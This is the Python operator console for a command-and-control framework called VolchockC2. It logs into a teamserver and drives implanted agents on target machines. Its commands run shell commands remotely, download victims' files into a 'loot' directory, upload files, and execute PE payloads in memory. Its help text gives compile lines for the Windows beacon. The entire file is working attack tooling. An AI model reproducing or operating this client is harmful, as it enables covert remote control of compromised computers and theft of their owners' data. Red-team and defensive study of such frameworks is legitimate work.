import argparse
import requests
from requests.auth import HTTPBasicAuth
import time
import base64
import os
from datetime import datetime

def list_agents(base_url, auth):
    resp = requests.get(f"{base_url}/agents", auth=auth)
    if resp.status_code == 401:
        print("[!] Invalid credentials.")
        return []
    agents = resp.json().get("agents", [])
    print("[*] Available agents:")
    for idx, ag in enumerate(agents):
        print(f"  {idx}: {ag.get('agent_id')}  (host: {ag.get('hostname')})")
    return agents

def get_agent_info(base_url, agent_id, auth):
    resp = requests.get(f"{base_url}/agent/{agent_id}/info", auth=auth)
    if resp.ok:
        info = resp.json().get("info", {})
        for k, v in info.items():
            if k == "last_seen":
                print(f"  {k}: {datetime.fromtimestamp(v).strftime('%Y-%m-%d %H:%M:%S')}")
            else:
                print(f"  {k}: {v}")
    else:
        print("[!] Can't retrieve agent infos.")

def queue_shell_command(base_url, agent_id, command, auth):
    payload = {"command": command}
    resp = requests.post(f"{base_url}/agent/{agent_id}/command", json=payload, auth=auth)
    if resp.status_code == 401:
        print("[!] Invalid credentials.")

def print_main_help():
    print("""
Available Commands:
--------------------
- generate
    Create a new beacon/client using the current configuration.

- list
    Display all available beacon/client profiles.

- use <num>
    Select a beacon/client profile by its number.
    Example: use 1

- quit
    Exit the program.
""")

def print_agent_help():
    print("""
Available Commands:
--------------------
- infos
    Display system information about the target machine.

- shell <cmd>
    Execute the specified shell command on the target machine.
    Example: shell whoami

- download <remote_file_path>
    Download a file from the target machine to the server.
    Example: download C:\\Users\\user\\Desktop\\file.txt

- upload <local_file_path>
    Upload a file from the server to the target machine.
    Example: upload /home/user/payload.exe
    
- exec-pe <local_file_path>
    In-memory execution of a local PE on the target machine.
    Example: exec-pe /home/user/payload.exe

- back
    Return to the previous menu or exit the current session.
""")

def print_generate_help():
    print("""
Manual Beacon Generation Instructions
-------------------------------------

1. Navigate to the agent/http directory:
   cd agent/http

2. Edit the configuration file to match your VolchockC2 profile:
   Open 'config.h' in your preferred text editor and adjust the settings as needed.

3. Compile the agent on Linux (cross-compiling for Windows):
   x86_64-w64-mingw32-g++ -o agent.exe main.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp -lwininet -lpsapi -static

4. Compile the agent on Windows:
   Open the 'Developer Command Prompt for VS' or use MinGW, then run:
   g++ -o agent.exe main.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp -lwininet -lpsapi -static

5. The output file 'agent.exe' can now be used as your beacon client.
            """)


def get_latest_result(base_url, agent_id, auth):
    resp = requests.get(f"{base_url}/agent/{agent_id}/results", auth=auth)
    if resp.ok:
        results = resp.json().get("results", [])
        return results
    else:
        print("[!] Can't retrieve result.")
        return None



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="VolchockC2 client shell")
    parser.add_argument('-i', '--ip-address', required=True, help='Teamserver IP address')
    parser.add_argument('-p', '--port', required=True, type=int, help='Teamserver admin port')
    parser.add_argument('-u', '--username', required=True, help="Operator username")
    parser.add_argument('--pwd', '--password', dest='password', required=True, help="Operator password")
    args = parser.parse_args()

    base_url = f"http://{args.ip_address}:{args.port}"
    auth = HTTPBasicAuth(args.username, args.password)

    while True:
        choice = input("volchockC2> ").strip()
        if choice == "list":
            agents = list_agents(base_url, auth)
        elif choice.startswith("generate"):
            print_generate_help()
        elif choice.startswith("use "):
            try:
                idx = int(choice.split()[1])
            except (IndexError, ValueError):
                print("Usage: use <num>")
                continue
            agents = list_agents(base_url, auth)
            if not agents or not (0 <= idx < len(agents)):
                print("Invalid agent id.")
                continue
            agent_id = agents[idx].get("agent_id")
            while True:
                ach = input("volchockC2 - agent> ").strip()
                if ach in ("back", "exit", "quit"):
                    break
                elif ach == "infos":
                    get_agent_info(base_url, agent_id, auth)
                elif ach.startswith("shell "):
                    cmd = ach[len("shell "):].strip()
                    if not cmd:
                        print("Usage: shell <command>")
                        continue
                    cmd_to_queue = str({"cmd":cmd})
                    queue_shell_command(base_url, agent_id, cmd_to_queue, auth)
                    last_seen = None
                    while(1):
                        results = get_latest_result(base_url, agent_id, auth)
                        if results is None:
                            break
                        if results:
                            latest = results[-1]
                            if latest != last_seen:
                                print(f"{latest}")
                                last_seen = latest
                                break
                        time.sleep(1)
                elif ach.startswith("download "):
                    cmd = ach[len("download "):].strip()
                    if not cmd:
                        print("Usage: download <remote_file_path>")
                        continue
                    cmd_to_queue = str({"download":cmd})
                    queue_shell_command(base_url, agent_id, cmd_to_queue, auth)
                    last_seen = None
                    while(1):
                        results = get_latest_result(base_url, agent_id, auth)
                        if results is None:
                            break
                        if results:
                            latest = results[-1]
                            if latest != last_seen:
                                loot_dir = 'loot'
                                if not os.path.exists(loot_dir):
                                    os.makedirs(loot_dir)
                                agent_dir = 'loot/'+str(agent_id)
                                if not os.path.exists(agent_dir):
                                    os.makedirs(agent_dir)
                                filename = os.path.basename(cmd)
                                dest_path = str(agent_dir)+"/"+str(filename)
                                with open(dest_path, 'wb') as f:
                                    f.write(base64.b64decode(latest))
                                print(f"[+] File saved : {dest_path}")
                                last_seen = latest
                                break
                        time.sleep(1)
                elif ach.startswith("upload "):
                    cmd = ach[len("upload "):].strip()
                    if not cmd:
                        print("Usage: upload <local_file_path>")
                        continue
                    with open(cmd, 'rb') as f:
                        file_content = f.read()
                    b64_encoded_file = base64.b64encode(file_content)
                    filename = os.path.basename(cmd)
                    fil_props = base64.b64encode( str({"filename":filename, "content":b64_encoded_file}).encode("utf-8", errors="replace"))
                    cmd_to_queue = str({"upload":fil_props})
                    queue_shell_command(base_url, agent_id, cmd_to_queue, auth)
                    last_seen = None
                    while(1):
                        results = get_latest_result(base_url, agent_id, auth)
                        if results is None:
                            break
                        if results:
                            latest = results[-1]
                            if latest != last_seen:
                                print(f"[+] File sent : {filename}")
                                last_seen = latest
                                break
                        time.sleep(1)
                elif ach.startswith("exec-pe "):
                    cmd = ach[len("exec-pe "):].strip()
                    if not cmd:
                        print("Usage: exec-pe <local_file_path> <args>")
                        continue
                    parts = cmd.strip().split(" ")
                    filepath = parts[0]
                    args = " ".join(parts[1:])
                    with open(filepath, 'rb') as f:
                        file_content = f.read()
                    b64_encoded_file = base64.b64encode(file_content)
                    filename = os.path.basename(filepath)
                    fil_props = base64.b64encode( str({"filename":filename, "content":b64_encoded_file, "args":args}).encode("utf-8", errors="replace"))
                    cmd_to_queue = str({"exec-pe":fil_props})
                    queue_shell_command(base_url, agent_id, cmd_to_queue, auth)
                    last_seen = None
                    while(1):
                        results = get_latest_result(base_url, agent_id, auth)
                        if results is None:
                            break
                        if results:
                            latest = results[-1]
                            if latest != last_seen:
                                print(f"[+] PE executed : {filename}")
                                last_seen = latest
                                break
                        time.sleep(1)
                elif len(ach)<1:
                    pass
                else:
                    print_agent_help()
        elif choice in ("quit", "exit"):
            print("Bye.")
            break
        elif len(choice)<1:
            pass
        else:
            print_main_help()
